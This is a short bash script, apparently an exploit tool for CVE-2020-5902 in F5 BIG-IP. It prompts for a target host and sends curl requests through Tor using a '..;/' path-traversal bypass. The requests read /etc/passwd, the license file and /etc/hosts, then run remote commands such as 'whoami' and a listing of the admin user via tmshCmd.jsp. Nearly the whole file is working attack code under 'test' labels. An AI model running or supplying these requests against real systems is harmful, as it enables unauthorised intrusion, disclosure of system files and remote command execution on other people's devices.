#!/bin/bash
# Copyleft by cbk914@riseup.net
# Version 0.1

clear
echo "********************************************"
echo "*** CVE-2020-5902 F5 BIG-IP Exploiter    ***"
echo "********************************************"
echo "\n"
echo "Target IP/host?\n"
read host
echo "\n"
echo "Confidentiality Test 1 - Read /etc/passwd\n"
torify curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
echo "\n"
echo "Confidentiality Test 2 - Read license file\n"
torify curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license'
echo "\n"
echo "Condifentiality Test 3 - Read /etc/hosts\n"
torify curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'
echo "\n"
echo "Integrity Test 1 - RCE exploit 1"
torify curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami'
echo "\n"
echo "Integrity Test 2 - RCE exploit 2"
torify curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'

# List all users
# tmsh -c "cd /; list auth user"
